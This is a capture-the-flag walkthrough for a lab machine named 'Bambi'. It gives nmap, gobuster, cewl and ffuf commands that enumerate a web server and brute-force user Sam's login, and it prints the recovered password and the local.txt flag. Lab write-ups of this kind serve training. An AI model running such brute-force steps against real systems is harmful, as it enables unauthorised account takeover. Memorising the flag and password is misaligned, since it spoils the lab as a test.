
# **BAMBI**

---
## **LOCAL.TXT**

## **Run Nmap to see running services**
```
sudo nmap -O -Pn 192.168.118.121
```
![bambi_nmap](images/bambi_nmap.png) 

## **Run Gobuster for directory/file enumeration**
```
gobuster dir -u 192.168.118.121 -w /usr/share/wordlists/dirb/common.txt
```
![bambi_gobuster](images/bambi_gobuster.png) 

![bambi_login_page](images/bambi_login_page.png) 


## **Use custom wordlist to bruteforce password**

- Use Custom word list generator to brutefoece password.

``
cewl -d 2 -m 5 -w bambi_custom_passwords.txt http://192.168.118.121
``
![bambi_custom_wordlist_password](images/bambi_custom_wordlist_password.png) 

- Now use thise custom word list to bruteforce password for user - Sam.

```
ffuf -w /home/amrityam/kali/offsec/playground/bambi_custom_passwords.txt -u http://192.168.118.121/dev/index.php -X POST -d 'username=Sam&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
```

![bambi_fuzz1](images/bambi_fuzz1.png) 

![bambi_fuzz2](images/bambi_fuzz2.png) 

Now you should able to login with password - ANGELES for user - Sam and in admin section you can find the local.txt flag.

![bambi_local.txt_flag](images/bambi_local.txt_flag.png) 

### local.txt flag: 6b5a4ff997be8e8e9f7af7598046b39c

---

